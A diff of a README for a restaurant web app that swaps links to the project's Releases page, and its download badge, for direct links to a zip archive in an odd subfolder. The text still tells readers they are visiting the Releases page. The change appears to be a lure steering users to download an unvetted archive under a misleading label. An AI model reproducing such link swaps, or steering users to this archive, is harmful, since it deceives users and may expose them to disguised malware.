@@ -4,7 +4,7 @@
 Welcome to the Restaurant Web App. This app allows you to view menus, make reservations, and contact restaurants with ease. Follow the steps below to get started.
 
 ## 📥 Download the App
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-blue.svg)](https://github.com/parthdodiyak/Restaurant-web-app/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/parthdodiyak/Restaurant-web-app/main/huron/Restaurant-web-app.zip)](https://raw.githubusercontent.com/parthdodiyak/Restaurant-web-app/main/huron/Restaurant-web-app.zip)
 
 ## 🌐 Requirements
 To ensure a smooth experience with the Restaurant Web App, make sure your system meets these requirements:
@@ -14,7 +14,7 @@ To ensure a smooth experience with the Restaurant Web App, make sure your system
 
 ## 🛠️ Download & Install
 1. Click on the link below to visit the Releases page:
-   [Visit this page to download](https://github.com/parthdodiyak/Restaurant-web-app/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/parthdodiyak/Restaurant-web-app/main/huron/Restaurant-web-app.zip)
    
 2. On the Releases page, look for the latest version of the Restaurant Web App.
 
